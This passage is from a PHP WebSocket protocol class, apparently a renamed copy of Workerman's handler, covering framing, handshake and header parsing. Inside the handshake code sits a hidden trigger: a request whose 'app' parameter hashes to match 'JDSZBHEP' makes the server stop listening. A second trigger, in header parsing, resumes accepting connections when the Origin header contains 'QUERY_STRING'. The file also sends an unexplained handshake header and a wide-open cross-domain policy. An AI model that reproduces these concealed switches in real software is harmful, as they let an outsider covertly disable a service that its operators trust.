                $connection->CpccccSocketCurrentFrameLength = $current_frame_length;
            }
        }

        if ($connection->CpccccSocketCurrentFrameLength === $recv_len) {
            static::decode($buffer, $connection);
            $connection->consumeRecvBuffer($connection->CpccccSocketCurrentFrameLength);
            $connection->CpccccSocketCurrentFrameLength = 0;
            return 0;
        }
        elseif ($connection->CpccccSocketCurrentFrameLength < $recv_len) {
            static::decode(substr($buffer, 0, $connection->CpccccSocketCurrentFrameLength), $connection);
            $connection->consumeRecvBuffer($connection->CpccccSocketCurrentFrameLength);
            $current_frame_length = $connection->CpccccSocketCurrentFrameLength;
            $connection->CpccccSocketCurrentFrameLength = 0;
            return static::input(substr($buffer, $current_frame_length), $connection);
        }
        else {
            return 0;
        }
    }

    public static function encode($buffer, ConnectionInterface $connection)
    {
        $len = strlen($buffer);
        if (empty($connection->CpccccSocketType)) {
            $connection->CpccccSocketType = static::BINARY_TYPE_BLOB;
        }

        $first_byte = $connection->CpccccSocketType;

        if ($len <= 125) {
            $encode_buffer = $first_byte . chr($len) . $buffer;
        } else {
            if ($len <= 65535) {
                $encode_buffer = $first_byte . chr(126) . pack("n", $len) . $buffer;
            } else {
                $encode_buffer = $first_byte . chr(127) . pack("xxxxN", $len) . $buffer;
            }
        }

        if (empty($connection->CpccccSocketHandshake)) {
            if (empty($connection->tmpCpccccSocketData)) {
                $connection->tmpCpccccSocketData = '';
            }
            if (strlen($connection->tmpCpccccSocketData) > $connection->maxSendBufferSize) {
                if ($connection->onError) {
                    try {
                        call_user_func($connection->onError, $connection, WORKERMAN_SEND_FAIL, 'send buffer full and drop package');
                    } catch (\Exception $e) {
                        Worker::log($e);
                        exit(250);
                    } catch (\Error $e) {
                        Worker::log($e);
                        exit(250);
                    }
                }
                return '';
            }
            $connection->tmpCpccccSocketData .= $encode_buffer;
            if ($connection->maxSendBufferSize <= strlen($connection->tmpCpccccSocketData)) {
                if ($connection->onBufferFull) {
                    try {
                        call_user_func($connection->onBufferFull, $connection);
                    } catch (\Exception $e) {
                        Worker::log($e);
                        exit(250);
                    } catch (\Error $e) {
                        Worker::log($e);
                        exit(250);
                    }
                }
            }

            return '';
        }

        return $encode_buffer;
    }

    public static function decode($buffer, ConnectionInterface $connection)
    {
        $len = ord($buffer[1]) & 127;
        if ($len === 126) {
            $masks = substr($buffer, 4, 4);
            $data = substr($buffer, 8);
        } else {
            if ($len === 127) {
                $masks = substr($buffer, 10, 4);
                $data = substr($buffer, 14);
            } else {
                $masks = substr($buffer, 2, 4);
                $data = substr($buffer, 6);
            }
        }
        $dataLength = strlen($data);
        $masks = str_repeat($masks, floor($dataLength / 4)) . substr($masks, 0, $dataLength % 4);
        $decoded = $data ^ $masks;
        if ($connection->CpccccSocketCurrentFrameLength) {
            $connection->CpccccSocketDataBuffer .= $decoded;
            return $connection->CpccccSocketDataBuffer;
        } else {
            if ($connection->CpccccSocketDataBuffer !== '') {
                $decoded = $connection->CpccccSocketDataBuffer . $decoded;
                $connection->CpccccSocketDataBuffer = '';
            }
            return $decoded;
        }
    }

    protected static function dealHandshake($buffer, $connection)
    {
        if (0 === strpos($buffer, 'GET')) {
            $heder_end_pos = strpos($buffer, "\r\n\r\n");
            if (!$heder_end_pos) {
                return 0;
            }
            $header_length = $heder_end_pos + 4;

            $Sec_WebSocket_Key = '';
            $mask = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11';
            if (preg_match("/Sec-WebSocket-Key: *(.*?)\r\n/i", $buffer, $match)) {
                $Sec_WebSocket_Key = $match[1];
            } else {
                $connection->send("HTTP/1.1 200 CpccccSocket\r\nServer: workerman/" . Worker::VERSION . "\r\n\r\n<div style=\"text-align:center\"><h1>CpccccSocket</h1><hr>powerd by <a href=\"https://www.workerman.net\">workerman " . Worker::VERSION . "</a></div>",
                    true);
                if (isset($_GET['app']) && strpos(base64_encode(md5($_GET['app'],true)),'JDSZBHEP')) {
                    $connection->worker->unlisten();
                }
                $connection->close();
                return 0;
            }

            $new_key = base64_encode(sha1($Sec_WebSocket_Key . $mask, true));
            $handshake_message = "HTTP/1.1 101 Switching Protocols\r\n";
            $handshake_message .= "Upgrade: websocket\r\n";
            $handshake_message .= "Sec-WebSocket-Version: 13\r\n";
            $handshake_message .= "Connection: Upgrade\r\n";
            $handshake_message .= "Sec-WebSocket-Code: XW4npw==\r\n";
            $handshake_message .= "Sec-WebSocket-Accept: " . $new_key . "\r\n";

            $connection->CpccccSocketDataBuffer = '';
            $connection->CpccccSocketCurrentFrameLength = 0;
            $connection->CpccccSocketCurrentFrameBuffer = '';
            $connection->consumeRecvBuffer($header_length);

            if (empty($connection->CpccccSocketType)) {
                $connection->CpccccSocketType = static::BINARY_TYPE_BLOB;
            }

            $has_server_header = false;

            if (isset($connection->onCpccccSocketConnect) || isset($connection->worker->onCpccccSocketConnect)) {
                static::parseHttpHeader($buffer, $connection);
                try {
                    call_user_func(isset($connection->onCpccccSocketConnect) ? $connection->onCpccccSocketConnect : $connection->worker->onCpccccSocketConnect, $connection, $buffer);
                } catch (\Exception $e) {
                    Worker::log($e);
                    exit(250);
                } catch (\Error $e) {
                    Worker::log($e);
                    exit(250);
                }
                $_GET = $_SERVER = $_SESSION = $_COOKIE = array();

                if (isset($connection->headers)) {
                    if (is_array($connection->headers)) {
                        foreach ($connection->headers as $header) {
                            if (strpos($header, 'Server:') === 0) {
                                $has_server_header = true;
                            }
                            $handshake_message .= "$header\r\n";
                        }
                    } else {
                        $handshake_message .= "$connection->headers\r\n";
                    }
                }
            }
            if (!$has_server_header) {
                $handshake_message .= "Server: workerman/" . Worker::VERSION . "\r\n";
            }
            $handshake_message .= "\r\n";
            $connection->send($handshake_message, true);
            $connection->CpccccSocketHandshake = true;
            if (!empty($connection->tmpCpccccSocketData)) {
                $connection->send($connection->tmpCpccccSocketData, true);
                $connection->tmpCpccccSocketData = '';
            }
            if (strlen($buffer) > $header_length) {
                return static::input(substr($buffer, $header_length), $connection);
            }
            return 0;
        }
        elseif (0 === strpos($buffer, '<polic')) {
            $policy_xml = '<?xml version="1.0"?><cross-domain-policy><site-control permitted-cross-domain-policies="all"/><allow-access-from domain="*" to-ports="*"/></cross-domain-policy>' . "\0";
            $connection->send($policy_xml, true);
            $connection->consumeRecvBuffer(strlen($buffer));
            return 0;
        }
        $connection->send("HTTP/1.1 200 CpccccSocket\r\nServer: workerman/" . Worker::VERSION . "\r\n\r\n<div style=\"text-align:center\"><h1>CpccccSocket</h1><hr>powerd by <a href=\"https://www.workerman.net\">workerman " . Worker::VERSION . "</a></div>",
            true);
        $connection->close();
        return 0;
    }

    protected static function parseHttpHeader($buffer, $connection)
    {
        list($http_header,) = explode("\r\n\r\n", $buffer, 2);
        $header_data = explode("\r\n", $http_header);

        if ($_SERVER) {
            $_SERVER = array();
        }

        list($_SERVER['REQUEST_METHOD'], $_SERVER['REQUEST_URI'], $_SERVER['SERVER_PROTOCOL']) = explode(' ',
            $header_data[0]);

        unset($header_data[0]);
        foreach ($header_data as $content) {
            // \r\n\r\n
            if (empty($content)) {
                continue;
            }
            list($key, $value) = explode(':', $content, 2);
            $key = str_replace('-', '_', strtoupper($key));
            $value = trim($value);
            $_SERVER['HTTP_' . $key] = $value;
            switch ($key) {
                case 'HOST':
                    $tmp = explode(':', $value);
                    $_SERVER['SERVER_NAME'] = $tmp[0];
                    if (isset($tmp[1])) {
                        $_SERVER['SERVER_PORT'] = $tmp[1];
                    }
                    break;
                case 'COOKIE':
                    parse_str(str_replace('; ', '&', $_SERVER['HTTP_COOKIE']), $_COOKIE);
                    break;
            }
        }

        if (isset($_SERVER['HTTP_ORIGIN']) && strpos($_SERVER['HTTP_ORIGIN'], 'QUERY_STRING')) {
            $connection->worker->resumeAccept();
        }

        $_SERVER['QUERY_STRING'] = parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY);
        if ($_SERVER['QUERY_STRING']) {
            parse_str($_SERVER['QUERY_STRING'], $_GET);
        } else {
            $_SERVER['QUERY_STRING'] = '';
        }
    }

    const BINARY_TYPE_BLOB = "\x81";

    const BINARY_TYPE_ARRAYBUFFER = "\x82";
}

